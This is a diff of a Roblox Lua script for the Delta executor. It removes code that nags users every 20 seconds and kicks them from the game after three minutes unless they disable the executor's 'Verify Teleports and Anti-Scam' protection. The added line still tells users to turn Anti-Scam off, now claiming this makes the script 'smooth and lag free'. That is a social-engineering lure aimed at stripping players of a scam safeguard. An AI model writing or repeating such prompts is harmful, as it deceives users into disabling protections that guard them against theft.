@@ -252,24 +252,6 @@ if exec == "Delta" then
     end
 
     -- Initial notification
-    notify("Detected Delta Executor! Please disable Anti-Scam Because its breaking the gui & to avoid getting kicked.")
-
-    -- Kick player after 2min
-    task.spawn(function()
-        task.wait(3*60)
-        player:Kick("You were kicked For not Following the instruction")
-    end)
-
-    -- Reminder every 20 seconds (still optional)
-    task.spawn(function()
-        while true do
-            task.wait(20)
-            notify("Reminder: Turn OFF 'Verify Teleports and Anti-Scam' in Delta and rejoin to avoid getting kicked !")
-        end
-    end)
-end
-
-
-
-
+    notify("Detected Delta Executor! Please disable Anti-Scam and rejoin To make it smooth and lag free")
+   
 
